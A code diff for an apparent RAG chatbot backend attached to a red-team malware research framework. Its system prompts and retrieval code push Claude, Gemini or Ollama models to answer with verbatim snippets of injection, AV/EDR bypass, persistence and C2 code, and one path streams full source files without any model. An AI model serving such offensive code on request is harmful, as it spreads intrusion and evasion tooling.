@@ -7,6 +7,7 @@ focused on: C2 channels, binary delivery, malware dev, threat simulation
 from __future__ import annotations
 import json
 import os
+import re
 import urllib.request
 from pathlib import Path
 from typing import Generator
@@ -14,11 +15,13 @@ from typing import Generator
 KB_FILE    = Path(__file__).parent / "knowledge_base.json"
 CONFIG_DIR = Path(__file__).parent.parent / "config"
 
-CLAUDE_MODEL = "claude-opus-4-6"
+CLAUDE_MODEL         = "claude-opus-4-6"
 GEMINI_MODEL_DEFAULT = "gemini-2.0-flash"
-OLLAMA_MODEL_DEFAULT = "qwen3:1.7b"
+OLLAMA_MODEL_DEFAULT = "qwen3:0.6b"
 
-# -- system prompt --------------------------------------------------------------
+
+# -- system prompts ---------------------------------------------------------------
+
 _SYSTEM_BASE = """You are Peekaboo AI - a high-end technical and educational assistant for the Peekaboo Threat Simulation Framework, created by Zhassulan Zhussupov (@cocomelonc).
 
 Your primary goal is to bridge the gap between offensive research, practice and defensive implementation. You analyze the ~/hacking/meow codebase to explain how adversarial techniques operate at the binary and kernel levels.
@@ -35,7 +38,7 @@ Your knowledge is grounded in the ~/hacking/meow codebase - real, working code c
 - **MITRE ATT&CK mapping**: TTP mapping for each technique
 
 The Peekaboo framework currently supports:
-- Crypto: Speck, FEAL-8, Lucifer, MARS, Treyfer, Camellia, A5/1, CAST128, DES, Madryga, Khufu, LOKI, RC5, RC6, SAFER, Skipjack, TEA (Tiny Encryption Algorithm), XTEA 
+- Crypto: Speck, FEAL-8, Lucifer, MARS, Treyfer, Camellia, A5/1, CAST128, DES, Madryga, Khufu, LOKI, RC5, RC6, SAFER, Skipjack, TEA (Tiny Encryption Algorithm), XTEA
 - Injection: VirtualAllocEx, EnumDesktopsA
 - Persistence: Registry Run, Winlogon, Screensaver Hijacking, File Type Hijacking
 - C2/Stealer: Angelcam, Azure, Telegram, GitHub, Bitbucket, VirusTotal
@@ -70,15 +73,35 @@ Avoid vague explanations - give concrete details about APIs, memory layouts, Win
 5. If a question is completely non-technical (greetings, meta questions), skip the code section but still be concise and direct.
 """
 
+_OLLAMA_SYSTEM_BASE = """/no_think
 
-# -- config loaders -------------------------------------------------------------
+You are Peekaboo AI Assistant.
+
+Answer fast, short, and technically.
+Use the retrieved KB context as the primary source.
+
+For technical questions:
+1. Give 2-3 concise sentences.
+2. If CODE SNIPPET FROM KB exists, include ONE short fenced code block.
+3. Add MITRE ATT&CK only if present in context or obvious.
+4. Add ONE detection / telemetry line.
+
+Rules:
+- Do not say "no specific code snippet is provided" if CODE SNIPPET FROM KB exists.
+- Do not invent code if no snippet exists.
+- Do not output <think> blocks.
+- Do not write long tutorials unless the user asks for details.
+"""
+
+
+# -- config loaders ---------------------------------------------------------------
 
 def _get_anthropic_key() -> str:
     cfg_path = CONFIG_DIR / "anthropic_config.json"
     if cfg_path.exists():
         try:
             data = json.loads(cfg_path.read_text())
-            key = data.get("api_key", "")
+            key  = data.get("api_key", "")
             if key and not key.startswith("sk-ant-xxx"):
                 return key
         except Exception:
@@ -86,44 +109,68 @@ def _get_anthropic_key() -> str:
     return os.environ.get("ANTHROPIC_API_KEY", "")
 
 
-def _get_gemini_config() -> tuple[str, str]:
-    """Returns (api_key, model)."""
+def _get_gemini_config() -> dict:
     cfg_path = CONFIG_DIR / "gemini_config.json"
+    defaults: dict = {
+        "api_key":           "",
+        "model":             GEMINI_MODEL_DEFAULT,
+        "temperature":       0.2,
+        "max_output_tokens": 512,
+        "thinking_budget":   0,
+        "kb_budget":         12_000,
+    }
     if cfg_path.exists():
         try:
             data = json.loads(cfg_path.read_text())
-            key   = data.get("api_key", "")
-            model = data.get("model", GEMINI_MODEL_DEFAULT)
-            if key and not key.startswith("AIzaxxx"):
-                return key, model
+            defaults.update(data)
         except Exception as e:
-            print ("get gemini config: ", str(e))
-    return os.environ.get("GEMINI_API_KEY", ""), GEMINI_MODEL_DEFAULT
+            print("get gemini config:", str(e))
+    if not defaults["api_key"] or defaults["api_key"].startswith("AIzaxxx"):
+        defaults["api_key"] = os.environ.get("GEMINI_API_KEY", "")
+    return defaults
 
 
 def _get_ollama_config() -> dict:
     cfg_path = CONFIG_DIR / "ollama_config.json"
-    defaults = {
-        "base_url":      "http://localhost:11434",
-        "model":         OLLAMA_MODEL_DEFAULT,
-        "temperature":   0.6,
-        "context_posts": 6,
+    defaults: dict = {
+        "base_url": "http://localhost:11434",
+        "model": "qwen3:1.7b",
+
+        "temperature": 0.15,
+        "top_p": 0.75,
+        "num_thread": 8,
+
+        # Fast RAG defaults
+        "context_posts": 2,
+        "context_posts_technical": 3,
+
+        # CPU-friendly
+        "num_ctx": 4096,
+        "num_predict": 384,
+
+        # Keep answers compact
+        "max_snippet_lines": 18,
+        "fallback_snippets": 1,
+
+        "keep_alive": "10m"
     }
+
     if cfg_path.exists():
         try:
             defaults.update(json.loads(cfg_path.read_text()))
         except Exception:
             pass
+
     return defaults
 
 
-# -- knowledge base -------------------------------------------------------------
+# -- knowledge base (Claude / Gemini full-context path) ---------------------------
 
-def _load_knowledge_base() -> str:
+def _load_knowledge_base(budget: int = 80_000) -> str:
     if not KB_FILE.exists():
         return ""
     try:
-        kb = json.loads(KB_FILE.read_text())
+        kb    = json.loads(KB_FILE.read_text())
         posts = kb.get("posts", [])
         if not posts:
             return ""
@@ -133,9 +180,9 @@ def _load_knowledge_base() -> str:
             f"Topics indexed: {len(posts)}",
             "---",
         ]
-        budget, used = 80_000, 0
+        used = 0
         for p in posts:
-            ref = p.get("ref") or p.get("url", "")
+            ref   = p.get("ref") or p.get("url", "")
             chunk = f"\n### {p['title']}\nRef: {ref}\n{p['content']}\n"
             if used + len(chunk) > budget:
                 break
@@ -147,7 +194,6 @@ def _load_knowledge_base() -> str:
 
 
 def _build_claude_system() -> list[dict] | str:
-    """System prompt with optional prompt-cached KB block for Claude."""
     kb_text = _load_knowledge_base()
     if not kb_text:
         return _SYSTEM_BASE
@@ -157,15 +203,25 @@ def _build_claude_system() -> list[dict] | str:
     ]
 
 
-def _build_gemini_system() -> str:
-    """Single system string for Gemini (no block format)."""
-    kb_text = _load_knowledge_base()
+_GEMINI_DEMO_SUFFIX = """
+
+## Response format (DEMO MODE - follow strictly)
+- Max 3 sentences of explanation.
+- ONE fenced code block from the KB (mandatory for technical questions).
+- ONE MITRE ATT&CK line if applicable.
+- ONE detection/telemetry line.
+- No long tutorials. No multi-section essays. Be fast and direct.
+"""
+
+
+def _build_gemini_system(kb_budget: int = 80_000) -> str:
+    kb_text = _load_knowledge_base(budget=kb_budget)
     if not kb_text:
-        return _SYSTEM_BASE
-    return _SYSTEM_BASE + kb_text
+        return _SYSTEM_BASE + _GEMINI_DEMO_SUFFIX
+    return _SYSTEM_BASE + kb_text + _GEMINI_DEMO_SUFFIX
 
 
-# -- Claude streaming -----------------------------------------------------------
+# -- Claude streaming -------------------------------------------------------------
 
 def _stream_claude(messages: list[dict]) -> Generator[str, None, None]:
     import anthropic
@@ -196,18 +252,20 @@ def _stream_claude(messages: list[dict]) -> Generator[str, None, None]:
         yield f"[=^..^=] Claude error: {e}"
 
 
-# -- Gemini streaming -----------------------------------------------------------
+# -- Gemini streaming -------------------------------------------------------------
 
 def _stream_gemini(messages: list[dict]) -> Generator[str, None, None]:
     from google import genai
     from google.genai import types
 
-    api_key, model = _get_gemini_config()
+    cfg     = _get_gemini_config()
+    api_key = cfg["api_key"]
+    model   = cfg["model"]
+
     if not api_key:
         yield "[=^..^=] Gemini API key not set. Add it to config/gemini_config.json"
         return
 
-    # convert messages to Gemini Content format
     contents = []
     for m in messages:
         role = "user" if m["role"] == "user" else "model"
@@ -216,15 +274,23 @@ def _stream_gemini(messages: list[dict]) -> Generator[str, None, None]:
     yield {"status": "connecting", "msg": "connecting to Gemini…"}
     client = genai.Client(api_key=api_key)
     try:
-        yield {"status": "generating", "msg": "generating response…"}
+        yield {"status": "generating", "msg": f"generating response…"}
+
+        gen_cfg = types.GenerateContentConfig(
+            system_instruction=_build_gemini_system(kb_budget=cfg.get("kb_budget", 12_000)),
+            max_output_tokens=cfg.get("max_output_tokens", 512),
+            temperature=cfg.get("temperature", 0.2),
+        )
+        budget = cfg.get("thinking_budget", 0)
+        try:
+            gen_cfg.thinking_config = types.ThinkingConfig(thinking_budget=budget)
+        except Exception:
+            pass
+
         response = client.models.generate_content_stream(
             model=model,
             contents=contents,
-            config=types.GenerateContentConfig(
-                system_instruction=_build_gemini_system(),
-                max_output_tokens=2048,
-                temperature=0.7,
-            ),
+            config=gen_cfg,
         )
         for chunk in response:
             if chunk.text:
@@ -232,48 +298,99 @@ def _stream_gemini(messages: list[dict]) -> Generator[str, None, None]:
     except Exception as e:
         err = str(e)
         if "API_KEY_INVALID" in err or "API key" in err:
-            yield f"[=^..^=] Invalid Gemini API key. Check config/gemini_config.json"
+            yield "[=^..^=] Invalid Gemini API key. Check config/gemini_config.json"
         else:
             yield f"[=^..^=] Gemini error: {e}"
 
 
-# -- Ollama RAG streaming -------------------------------------------------------
+# -- technical-question detector (used by RAG and canned gate) --------------------
 
-def _rag_context(question: str, n: int = 6) -> str:
-    """Retrieve top-n relevant posts via semantic search, return formatted context block."""
-    try:
-        import sys, os
-        sys.path.insert(0, os.path.dirname(__file__))
-        from semantic import find_related_posts
-        posts = find_related_posts(question, max_results=n)
-    except Exception as e:
-        print(f"[ollama] rag retrieval error: {e}")
+_TECHNICAL_MARKERS = [
+    "code", "snippet", "source", "implementation", "api", "winapi",
+    "virtualalloc", "virtualallocex", "virtualprotect", "createthread",
+    "createremotethread", "writeprocessmemory", "queueuserapc",
+    "enumdesktop", "ntcreate", "ntallocate", "syscall", "hell's gate",
+    "halosgate", "tartarusgate", "shellcode", "loader", "payload",
+    "injection", "process injection", "apc", "hollowing", "section",
+    "c2", "telegram", "github", "bitbucket", "virustotal", "webhook",
+    "persistence", "registry", "run key", "winlogon", "dll hijack",
+    "amsi", "etw", "unhooking", "api hashing", "hashing",
+    "encrypt", "encryption", "xor", "speck", "tea", "xtea", "mars",
+    "feal", "treyfer", "lucifer", "camellia",
+    "yara", "sigma", "sysmon", "telemetry", "detection",
+    "mitre", "att&ck", "t1055", "t1106", "t1027", "t1547", "t1102",
+]
+
+
+def _is_technical_question(question: str) -> bool:
+    q = question.lower()
+    return any(marker in q for marker in _TECHNICAL_MARKERS)
+
+
+_FULL_CODE_MARKERS = [
+    "full code", "full snippet", "source code", "entire code", "whole code",
+    "show full", "full source", "show the code", "show me the code",
+    "code from meow", "code from kb", "source from kb", "all code",
+    "complete code", "complete snippet", "full implementation",
+    "entire implementation", "full file", "whole file", "entire file",
+    "give me the code", "print the code", "show source",
+]
+
+
+def _is_full_code_request(question: str) -> bool:
+    q = question.lower()
+    return any(marker in q for marker in _FULL_CODE_MARKERS)
+
+
+# -- RAG helpers ------------------------------------------------------------------
+
+def _norm_text(s: str) -> str:
+    return re.sub(r"[^a-z0-9]+", " ", (s or "").lower()).strip()
+
+
+def _extract_code_blocks(text: str, max_lines: int = 18) -> str:
+    """Extract first fenced code block from markdown. Returns code without fences."""
+    if not text:
         return ""
-
-    if not posts:
+    m = re.search(
+        r"```(?:c|cpp|c\+\+|python|py|nim|asm|nasm|powershell|bash)?\s*\n(.*?)```",
+        text, re.S | re.I,
+    )
+    if not m:
         return ""
+    lines = m.group(1).strip().splitlines()[:max_lines]
+    return "\n".join(lines)
 
-    blocks = []
-    for p in posts:
-        title    = p.get("title", "")
-        url      = p.get("blog_url", "")
-        cat      = p.get("category", "")
-        aids     = ", ".join(p.get("attack_ids", []))
-        score    = p.get("score", 0)
-        # try to get the code snippet from library cache
-        snippet  = _get_snippet_for_post(p)
-        block = f"### {title}\n- URL: {url}\n- Category: {cat}"
-        if aids:
-            block += f"\n- ATT&CK: {aids}"
-        block += f"\n- Relevance: {score:.0%}"
-        if snippet:
-            block += f"\n\n```c\n{snippet}\n```"
-        blocks.append(block)
 
-    return "\n\n".join(blocks)
+def _guess_lang(snippet: str) -> str:
+    s = snippet.lower()
+    if "#include" in s or "winapi" in s or "handle " in s or "dword" in s:
+        return "c"
+    if "import " in s or "def " in s:
+        return "python"
+    if "section ." in s or "global " in s or "syscall" in s:
+        return "asm"
+    if "proc " in s and "nim" in s:
+        return "nim"
+    return "c"
+
+
+def _entry_matches_question(entry: dict, question: str) -> int:
+    """Count how many 4+-char words from question appear in this library entry's metadata."""
+    q   = _norm_text(question)
+    hay = _norm_text(" ".join([
+        str(entry.get("slug",        "")),
+        str(entry.get("title",       "")),
+        str(entry.get("url",         "")),
+        str(entry.get("category",    "")),
+        str(entry.get("description", "")),
+        str(entry.get("attack_ids",  "")),
+    ]))
+    return sum(1 for word in q.split() if len(word) >= 4 and word in hay)
 
 
 _library_cache: list[dict] | None = None
+
 
 def _get_library() -> list[dict]:
     global _library_cache
@@ -290,58 +407,247 @@ def _get_library() -> list[dict]:
     return _library_cache
 
 
-def _get_snippet_for_post(post: dict) -> str:
-    """Look up a code snippet from library_cache by slug."""
-    slug = post.get("slug") or post.get("title", "")
-    if not slug:
-        return ""
+def _get_snippet_for_post(post: dict, question: str = "", max_lines: int = 18) -> tuple[str, str, str]:
+    """
+    Return (snippet, source_slug, language).
+
+    Priority:
+    1. Exact slug match in library_cache.json
+    2. Exact normalized title / url match
+    3. Fuzzy match on post-identity tokens (slug + title + url) vs library entries
+    4. Question-keyword fallback if post identity yielded nothing
+    5. Code block extracted from the post's own content field
+    """
+    slug  = post.get("slug")     or ""
+    title = post.get("title")    or ""
+    url   = post.get("blog_url") or post.get("url") or ""
+
+    # tokens that describe *this specific post* (used for identity-based matching)
+    post_tokens = {t for t in _norm_text(" ".join([slug, title, url])).split() if len(t) >= 4}
+    post_ids    = {_norm_text(x) for x in [slug, title, url] if x}
+
+    best_entry: dict | None = None
+    best_score  = -1
+
     for entry in _get_library():
-        if entry.get("slug") == slug:
-            snip = entry.get("snippet", "")
-            if snip:
-                lines = snip.splitlines()[:35]
-                return "\n".join(lines)
-    return ""
+        # 1. exact slug match
+        if slug and entry.get("slug") == slug:
+            best_entry, best_score = entry, 999
+            break
+
+        # 2. exact normalized match on any identity field
+        e_slug  = _norm_text(str(entry.get("slug",  "")))
+        e_title = _norm_text(str(entry.get("title", "")))
+        e_url   = _norm_text(str(entry.get("url",   "")))
+        if any(x and x in {e_slug, e_title, e_url} for x in post_ids):
+            best_entry, best_score = entry, 999
+            break
+
+        # 3. fuzzy: shared tokens between this post's identity and the entry's identity
+        entry_hay = _norm_text(" ".join([
+            str(entry.get("slug",     "")),
+            str(entry.get("title",    "")),
+            str(entry.get("url",      "")),
+            str(entry.get("category", "")),
+        ]))
+        score = sum(1 for t in post_tokens if t in entry_hay)
+        if score > best_score:
+            best_entry, best_score = entry, score
+
+    # 4. nothing matched post identity -> fall back to question keywords
+    if best_score <= 0 and question:
+        for entry in _get_library():
+            score = _entry_matches_question(entry, question)
+            if score > best_score:
+                best_entry, best_score = entry, score
+
+    if best_entry and best_score > 0:
+        snip = best_entry.get("snippet", "") or best_entry.get("code", "")
+        if snip:
+            snippet = "\n".join(snip.splitlines()[:max_lines]).strip()
+            return snippet, str(best_entry.get("slug") or slug or title), _guess_lang(snippet)
+        content = best_entry.get("content", "") or best_entry.get("markdown", "")
+        snippet = _extract_code_blocks(content, max_lines=max_lines)
+        if snippet:
+            return snippet, str(best_entry.get("slug") or slug or title), _guess_lang(snippet)
+
+    # 5. try the post's own content field
+    content = post.get("content", "") or post.get("text", "") or post.get("markdown", "")
+    snippet = _extract_code_blocks(content, max_lines=max_lines)
+    if snippet:
+        return snippet, slug or title, _guess_lang(snippet)
+
+    return "", slug or title or url, "c"
 
 
-def _build_ollama_system(context: str) -> str:
-    # /no_think disables qwen3 extended thinking mode
-    base = "/no_think\n\n" + _SYSTEM_BASE
+def _fallback_snippets_from_library(question: str, limit: int = 2, max_lines: int = 45) -> list[dict]:
+    """
+    Last-resort snippet search over library_cache.json.
+    Called when semantic search found posts but none had attached snippets.
+    Prevents Ollama from saying "no code snippet" when the technique exists.
+    """
+    scored: list[tuple[int, dict]] = []
+    for entry in _get_library():
+        score = _entry_matches_question(entry, question)
+        snip  = entry.get("snippet", "") or entry.get("code", "")
+        if not snip:
+            content = entry.get("content", "") or entry.get("markdown", "")
+            snip = _extract_code_blocks(content)
+        if score > 0 and snip:
+            scored.append((score, {**entry, "_snippet": snip}))
+
+    scored.sort(key=lambda x: x[0], reverse=True)
+    results = []
+    for _, entry in scored[:limit]:
+        snippet = entry["_snippet"]
+        results.append({
+            "title":    entry.get("title",    ""),
+            "slug":     entry.get("slug",     ""),
+            "url":      entry.get("url",      ""),
+            "category": entry.get("category", ""),
+            "snippet":  "\n".join(snippet.splitlines()[:max_lines]),
+            "lang":     _guess_lang(snippet),
+        })
+    return results
+
+
+def _rag_context(question: str, n: int = 6, max_lines: int = 18) -> str:
+    """Retrieve top-n relevant posts, attach real code snippets, return context block."""
+    try:
+        import sys, os as _os
+        sys.path.insert(0, _os.path.dirname(__file__))
+        from semantic import find_related_posts
+        posts = find_related_posts(question, max_results=n)
+    except Exception as e:
+        print(f"[rag] retrieval error: {e}")
+        posts = []
+
+    blocks:         list[str] = []
+    snippets_found: int       = 0
+
+    for p in posts:
+        title = p.get("title",    "")
+        url   = p.get("blog_url", "") or p.get("url", "")
+        cat   = p.get("category", "")
+        aids  = ", ".join(p.get("attack_ids", []))
+        score = p.get("score",    0)
+
+        snippet, source_slug, lang = _get_snippet_for_post(p, question=question, max_lines=max_lines)
+
+        block = f"### {title}\n- Source slug: {source_slug}\n- URL: {url}\n- Category: {cat}"
+        if aids:
+            block += f"\n- ATT&CK: {aids}"
+        try:
+            block += f"\n- Relevance: {score:.0%}"
+        except Exception:
+            block += f"\n- Relevance: {score}"
+
+        if snippet:
+            snippets_found += 1
+            block += f"\n\nCODE SNIPPET FROM KB - USE THIS IN THE ANSWER:\n```{lang}\n{snippet}\n```"
+        else:
+            block += "\n\nCODE SNIPPET: not attached for this post"
+
+        blocks.append(block)
+
+    # if semantic search found posts but none had snippets, scan library_cache directly
+    if _is_technical_question(question) and snippets_found == 0:
+        fallback = _fallback_snippets_from_library(question, limit=2, max_lines=max_lines)
+        if fallback:
+            blocks.append("## Fallback code snippets from library_cache.json")
+            for item in fallback:
+                snippets_found += 1
+                blocks.append(
+                    f"### {item.get('title') or item.get('slug')}\n"
+                    f"- Source slug: {item.get('slug')}\n"
+                    f"- URL: {item.get('url')}\n"
+                    f"- Category: {item.get('category')}\n\n"
+                    f"CODE SNIPPET FROM KB - USE THIS IN THE ANSWER:\n"
+                    f"```{item.get('lang', 'c')}\n{item.get('snippet')}\n```"
+                )
+
+    if not blocks:
+        return "No relevant KB posts found."
+
+    if _is_technical_question(question) and snippets_found == 0:
+        blocks.append(
+            "## Retrieval warning\n"
+            "KB snippet not found for this exact query. "
+            "Explain using available metadata, but do not claim the technique does not exist."
+        )
+
+    return "\n\n".join(blocks)
+
+
+# -- Ollama streaming -------------------------------------------------------------
+
+def _build_ollama_system(context: str, full_code: bool = False) -> str:
+    base = _OLLAMA_SYSTEM_BASE
+    if full_code:
+        base += "\n## Mode: FULL CODE - include the complete CODE SNIPPET FROM KB verbatim, no truncation.\n"
+    else:
+        base += "\n## Mode: FAST - be concise, include only the most relevant portion of the code snippet.\n"
     if context:
         base += f"""
-
-## Retrieved knowledge base context (most relevant to this question):
+## Retrieved knowledge base context
 
 {context}
 
-Use this context to give precise, code-grounded answers. Reference blog URLs when citing examples.
+Use this context as the primary source. Prefer "CODE SNIPPET FROM KB" blocks.
+Cite the source slug or title when including code.
+"""
+    else:
+        base += """
+## Retrieved knowledge base context
+
+No context was retrieved. If the question is technical, say KB context was not found
+and answer cautiously without fabricating code.
 """
     return base
 
 
 def _stream_ollama(messages: list[dict]) -> Generator[str, None, None]:
-    cfg = _get_ollama_config()
+    cfg      = _get_ollama_config()
     base_url = cfg["base_url"].rstrip("/")
     model    = cfg["model"]
-    temp     = cfg.get("temperature", 0.6)
-    n_ctx    = cfg.get("context_posts", 6)
+    temp     = cfg.get("temperature", 0.2)
 
-    # RAG: embed the latest user message to retrieve context
     last_user = next(
         (m["content"] for m in reversed(messages) if m.get("role") == "user"), ""
     )
-    yield {"status": "rag", "msg": "searching knowledge base…"}
-    context = _rag_context(last_user, n=n_ctx) if last_user else ""
-    yield {"status": "generating", "msg": f"sending to {model}…"}
+    technical = _is_technical_question(last_user)
+    full_code = _is_full_code_request(last_user)
 
-    system_prompt = _build_ollama_system(context)
+    n_posts = cfg.get("context_posts_technical", 5) if technical else cfg.get("context_posts", 3)
+
+    if full_code:
+        max_lines   = 400
+        num_predict = 2048
+        num_ctx_val = 16384
+    else:
+        max_lines   = cfg.get("max_snippet_lines", 30)
+        num_predict = cfg.get("num_predict", 384)
+        num_ctx_val = cfg.get("num_ctx", 4096)
+
+    yield {"status": "rag", "msg": "searching knowledge base…"}
+    context = _rag_context(last_user, n=n_posts, max_lines=max_lines) if last_user else ""
+
+    yield {"status": "generating", "msg": f"sending to {model}…"}
+    system_prompt = _build_ollama_system(context, full_code=full_code)
 
     payload = json.dumps({
-        "model":   model,
-        "stream":  True,
-        "think":   False,          # disable extended thinking for qwen3
-        "options": {"temperature": temp, "num_predict": 2048},
-        "messages": [{"role": "system", "content": system_prompt}] + messages,
+        "model":      model,
+        "stream":     True,
+        "think":      False,
+        "keep_alive": cfg.get("keep_alive", "10m"),
+        "options": {
+            "temperature": temp,
+            "num_ctx":     num_ctx_val,
+            "num_predict": num_predict,
+            "num_thread":  cfg.get("num_thread", 8),
+            "top_p":       cfg.get("top_p",      0.8),
+        },
+        "messages": [{"role": "system", "content": system_prompt}] + messages[-4:],
     }).encode()
 
     url = f"{base_url}/api/chat"
@@ -352,55 +658,191 @@ def _stream_ollama(messages: list[dict]) -> Generator[str, None, None]:
             method="POST",
         )
         with urllib.request.urlopen(req, timeout=300) as resp:
-            # qwen3 emits thinking tokens ending with </think> before the real answer
-            tokens: list[str] = []
-            past_think = False
-            emitted_thinking_event = False
+            in_think     = False
+            think_buffer = ""
+
             for raw_line in resp:
                 line = raw_line.decode("utf-8").strip()
                 if not line:
                     continue
                 try:
                     chunk = json.loads(line)
-                    token = chunk.get("message", {}).get("content", "")
-                    if token:
-                        if past_think:
-                            yield token
-                        else:
-                            if not emitted_thinking_event:
-                                yield {"thinking": True}
-                                emitted_thinking_event = True
-                            tokens.append(token)
-                            joined = "".join(tokens)
-                            if "</think>" in joined:
-                                past_think = True
-                                yield {"thinking": False}
-                                after = joined.split("</think>", 1)[1]
-                                tokens = []
-                                if after:
-                                    yield after
-                    if chunk.get("done"):
-                        if not past_think:
-                            if emitted_thinking_event:
-                                yield {"thinking": False}
-                            yield "".join(tokens)
-                        break
                 except json.JSONDecodeError:
                     continue
+
+                token = chunk.get("message", {}).get("content", "")
+
+                if token:
+                    if "<think>" in token:
+                        in_think = True
+                        yield {"thinking": True}
+                        before, _, rest = token.partition("<think>")
+                        if before:
+                            yield before
+                        think_buffer = rest
+                        continue
+
+                    if in_think:
+                        think_buffer += token
+                        if "</think>" in think_buffer:
+                            in_think = False
+                            yield {"thinking": False}
+                            _, _, after = think_buffer.partition("</think>")
+                            think_buffer = ""
+                            if after:
+                                yield after
+                        continue
+
+                    yield token
+
+                if chunk.get("done"):
+                    if in_think:
+                        yield {"thinking": False}
+                    break
+
     except urllib.error.URLError as e:
         yield f"[=^..^=] Ollama connection error: {e}. Is Ollama running?"
     except Exception as e:
         yield f"[=^..^=] Ollama error: {e}"
 
 
+# -- direct KB code response (no LLM, instant, demo-grade) -----------------------
+
+def _read_src_file(src_path: str, max_lines: int = 600) -> str:
+    """Read a real source file from disk, capped at max_lines. Verbatim, no LLM."""
+    if not src_path:
+        return ""
+    try:
+        p = Path(src_path)
+        if not p.exists() or not p.is_file():
+            return ""
+        text  = p.read_text(errors="replace")
+        lines = text.splitlines()
+        if len(lines) > max_lines:
+            tail = f"\n// ... [{len(lines) - max_lines} more lines truncated]"
+            return "\n".join(lines[:max_lines]) + tail
+        return text
+    except Exception:
+        return ""
+
+
+def _direct_kb_response(question: str, max_lines: int = 600) -> str:
+    """
+    Bypass the LLM entirely for full-code requests.
+    Pulls verbatim source from src_path (or library snippet fallback).
+    Demo-grade: instant on CPU, complete, never truncated by token limits.
+    """
+    try:
+        import sys as _sys, os as _os
+        _sys.path.insert(0, _os.path.dirname(__file__))
+        from semantic import find_related_posts
+        posts = find_related_posts(question, max_results=3)
+    except Exception as e:
+        print(f"[direct_kb] retrieval error: {e}")
+        posts = []
+
+    blocks:     list[str] = []
+    seen_slugs: set       = set()
+    library              = _get_library()
+
+    def _render(entry: dict, fallback_title: str = "") -> str | None:
+        slug = entry.get("slug") or ""
+        if slug in seen_slugs:
+            return None
+        code = _read_src_file(entry.get("src_path", ""), max_lines=max_lines)
+        if not code:
+            code = entry.get("snippet", "") or entry.get("code", "")
+        if not code:
+            return None
+        seen_slugs.add(slug)
+
+        title = entry.get("title") or fallback_title or slug
+        url   = entry.get("blog_url") or entry.get("url", "")
+        cat   = entry.get("category", "")
+        aids  = entry.get("attack_ids", "")
+        if isinstance(aids, list):
+            aids = ", ".join(aids)
+        lang  = _guess_lang(code)
+
+        block = f"## {title}\n\n**Source:** `{slug}`  \n"
+        if url:  block += f"**URL:** {url}  \n"
+        if cat:  block += f"**Category:** {cat}  \n"
+        if aids: block += f"**MITRE ATT&CK:** {aids}\n"
+        block += f"\n```{lang}\n{code}\n```\n"
+        return block
+
+    # 1. match retrieved posts to library entries (slug -> title)
+    for p in posts:
+        slug  = p.get("slug")  or ""
+        title = p.get("title") or ""
+        entry = None
+        for e in library:
+            if (slug and e.get("slug") == slug) or (title and e.get("title") == title):
+                entry = e
+                break
+        if entry:
+            b = _render(entry, fallback_title=title)
+            if b:
+                blocks.append(b)
+
+    # 2. keyword-fallback scan if semantic search yielded nothing usable
+    if not blocks:
+        scored: list[tuple[int, dict]] = []
+        for entry in library:
+            score = _entry_matches_question(entry, question)
+            if score > 0:
+                scored.append((score, entry))
+        scored.sort(key=lambda x: x[0], reverse=True)
+        for _, entry in scored[:2]:
+            b = _render(entry)
+            if b:
+                blocks.append(b)
+
+    if not blocks:
+        return (
+            "No matching KB code snippet found. Try a more specific keyword, "
+            "for example: *show full code for VirtualAllocEx injection*, "
+            "*source code for Speck encryption*, *full source for APC injection*."
+        )
+
+    return "Here is the verbatim code from the knowledge base:\n\n" + "\n\n---\n\n".join(blocks)
+
+
+def _stream_kb_chunks(
+    text: str,
+    word_delay: float = 0.004,
+    line_delay: float = 0.010,
+    space_delay: float = 0.001,
+) -> Generator[str, None, None]:
+    """
+    Word-by-word streaming for direct KB responses - mimics LLM token cadence
+    so the frontend sees the same "typing" effect it gets from Ollama/Claude/Gemini.
+
+    Tokenization keeps whitespace runs as their own tokens, which preserves
+    indentation and blank lines in code blocks exactly as written on disk.
+
+    Tuning: ~3000 word-tokens for a 14k-char response × 4ms ≈ 12s total
+    (with a small extra pause at every newline so code renders line-by-line).
+    """
+    import re, time
+    for tok in re.findall(r"\s+|\S+", text):
+        yield tok
+        if "\n" in tok:
+            time.sleep(line_delay)
+        elif tok.isspace():
+            time.sleep(space_delay)
+        else:
+            time.sleep(word_delay)
+
+
 def _ollama_available() -> tuple[bool, str]:
-    cfg = _get_ollama_config()
+    cfg      = _get_ollama_config()
     base_url = cfg["base_url"].rstrip("/")
     model    = cfg["model"]
     try:
         req = urllib.request.Request(f"{base_url}/api/tags", method="GET")
         with urllib.request.urlopen(req, timeout=3) as resp:
-            data = json.loads(resp.read())
+            data  = json.loads(resp.read())
             names = [m["name"] for m in data.get("models", [])]
             if any(model.split(":")[0] in n for n in names):
                 return True, model
@@ -409,797 +851,199 @@ def _ollama_available() -> tuple[bool, str]:
         return False, "ollama offline"
 
 
-# -- canned answers for demo speed ---------------------------------------------
+# -- canned answers: onboarding only (stable, no LLM needed) ---------------------
+# Technical questions skip this entirely -> RAG -> LLM.
 
 _CANNED: list[tuple[str, str]] = [
-    # -- What is Peekaboo ------------------------------------------------------
+
+    # 1. what is Peekaboo? ---------------------------------------------------------
     (
         r"what is peekaboo|what('s| is) this (framework|tool|project)|explain peekaboo",
         """## Peekaboo - APT Simulation Framework
 
-**Peekaboo** is an open-source threat simulation and malware development research framework by **@cocomelonc**, designed to bridge offensive research with defensive implementation.
+**Peekaboo** is an open-source threat simulation and malware development research framework by **@cocomelonc**, designed for red team education and defensive implementation research.
 
-### Capabilities at a glance
+### Coverage at a glance
 
-| Category | Techniques | Examples |
+| Category | ATT&CK | Techniques |
 |---|---|---|
-| **C2 channels** | T1102, T1071 | Telegram bot, GitHub Issues, Bitbucket, VirusTotal abuse |
-| **Process injection** | T1055 | VirtualAllocEx, EnumDesktopsA, APC, DLL hollowing |
+| **C2 channels** | T1102, T1071 | Telegram, GitHub Issues, Bitbucket, VirusTotal abuse |
+| **Process injection** | T1055 | VirtualAllocEx, EnumDesktopsA, APC, section mapping |
 | **AV/EDR bypass** | T1027, T1562 | Direct syscalls, API hashing, AMSI patch, unhooking |
-| **Payload crypto** | T1027, T1140 | Speck, FEAL-8, MARS, Treyfer, Lucifer, TEA, XTEA |
+| **Payload crypto** | T1027, T1140 | Speck, FEAL-8, MARS, Treyfer, TEA, XTEA, Camellia… |
 | **Persistence** | T1547, T1574 | Registry Run, Winlogon, DLL hijacking, screensaver |
-| **Exfiltration** | T1041 | Stealer + C2 channel combo |
+| **Exfiltration** | T1041 | Stealer + C2 channel combos |
 
-### Minimal XOR shellcode dropper (starter template)
+Every module ships with a blog post covering mechanics, WinAPI details, SIGMA detection rules, and MITRE mapping. Browse all techniques in the **Module Library** panel, or analyse compiled samples in **PE Inspector**.
 
-```c
-#include <windows.h>
-
